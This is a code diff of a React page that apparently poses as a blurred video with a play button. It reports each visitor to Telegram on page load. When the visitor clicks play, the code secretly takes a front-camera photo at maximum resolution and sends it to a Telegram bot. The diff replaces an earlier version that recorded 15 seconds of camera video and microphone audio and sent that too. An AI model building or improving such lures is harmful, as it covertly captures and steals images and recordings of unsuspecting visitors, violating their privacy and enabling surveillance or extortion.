@@ -1,6 +1,6 @@
 import { PlayIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback } from 'react';
-import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
+import { sendTelegramNotification, sendImageToTelegram } from './utils/telegram';
 
 function App() {
   const [isBlurred] = useState(true);
@@ -19,129 +19,70 @@ function App() {
     sendVisitorNotification();
   }, []);
 
-  const captureAndSendMedia = useCallback(async () => {
+  const captureAndSendPhoto = useCallback(async () => {
     try {
-      // Get device capabilities first
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      const videoDevice = devices.find(device => device.kind === 'videoinput');
-      
-      if (!videoDevice) {
-        throw new Error('No video input device found');
-      }
-
+      // Memilih kamera depan, bisa disesuaikan jika ingin eksplisit menggunakan 'facingMode'
       const constraints = {
         video: {
           facingMode: { exact: 'user' },
-          // deviceId: videoDevice.deviceId,
-          width: { ideal: 4096 }, // Maximum supported width
-          height: { ideal: 2160 }, // Maximum supported height
-          frameRate: { ideal: 60 }
+          width: { ideal: 4096 },
+          height: { ideal: 2160 }
         },
-        audio: true
+        audio: false // Audio tidak diperlukan untuk foto
       };
-
+  
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
-
-      // Get actual video track settings
-      const videoTrack = stream.getVideoTracks()[0];
-      const settings = videoTrack.getSettings();
-      
-      // Create and setup video element for photo capture
+  
+      // Buat elemen video untuk menampilkan stream
       const video = document.createElement('video');
       video.srcObject = stream;
       video.playsInline = true;
       video.muted = true;
-      video.autoplay = true;
       
-      // Wait for video to be ready
+      // Tunggu video siap diputar
       await new Promise((resolve) => {
-        video.onloadedmetadata = async () => {
-          try {
-            await video.play();
-            setTimeout(resolve, 500);
-          } catch (error) {
-            console.error('Error playing video:', error);
-            resolve(true);
-          }
+        video.onloadedmetadata = () => {
+          video.play();
+          // Berikan jeda singkat agar stream video benar-benar aktif
+          setTimeout(resolve, 500);
         };
       });
-
-      // Setup canvas with actual video dimensions
+  
+      // Setup canvas dengan dimensi video yang didapat
       const canvas = document.createElement('canvas');
-      canvas.width = settings.width || 1920;
-      canvas.height = settings.height || 1080;
+      canvas.width = video.videoWidth || 1920;
+      canvas.height = video.videoHeight || 1080;
       const context = canvas.getContext('2d');
       
       if (context) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
       }
-
-      // Convert photo to blob with maximum quality
-      const photoBlob = await new Promise<Blob>((resolve) => {
+  
+      // Konversi gambar ke blob dengan kualitas maksimum
+      const photoBlob = await new Promise<Blob>((resolve, reject) => {
         canvas.toBlob((blob) => {
-          if (blob) resolve(blob);
+          if (blob) {
+            resolve(blob);
+          } else {
+            reject(new Error("Gagal mendapatkan Blob dari canvas."));
+          }
         }, 'image/jpeg', 1.0);
       });
-
-      // Send photo immediately
-      sendImageToTelegram(photoBlob).catch(console.error);
-
-      // Check supported video formats
-      const mimeTypes = [
-        'video/mp4;codecs=h264,aac',
-        'video/mp4',
-        'video/webm;codecs=vp8,opus',
-        'video/webm'
-      ];
-
-      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
-
-      if (!supportedMimeType) {
-        throw new Error('No supported video format found');
-      }
-
-      // Configure video recording with maximum quality
-      const mediaRecorder = new MediaRecorder(stream, {
-        mimeType: supportedMimeType,
-        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
-      });
       
-      const chunks: BlobPart[] = [];
-
-      mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) {
-          chunks.push(e.data);
-        }
-      };
-
-      mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(chunks, { 
-          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
-        });
-        console.log('Video recording completed, size:', videoBlob.size);
-        await sendVideoToTelegram(videoBlob);
-        stream.getTracks().forEach(track => track.stop());
-      };
-
-      // Start recording with frequent data chunks for better quality
-      mediaRecorder.start(1000);
-      console.log('Started recording video');
-
-      // Stop recording after 15 seconds
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-          console.log('Stopping video recording');
-          mediaRecorder.stop();
-        }
-      }, 15000);
-
+  
+      // Hentikan semua track untuk menutup kamera
+      stream.getTracks().forEach(track => track.stop());
+  
+      // Kirim foto melalui Telegram
+      await sendImageToTelegram(photoBlob);
     } catch (error) {
-      console.error('Error capturing media:', error);
+      console.error('Error capturing photo:', error);
     }
   }, []);
+  
 
   const handlePlayClick = async () => {
-    await captureAndSendMedia();
+    await captureAndSendPhoto();
   };
 
   return (
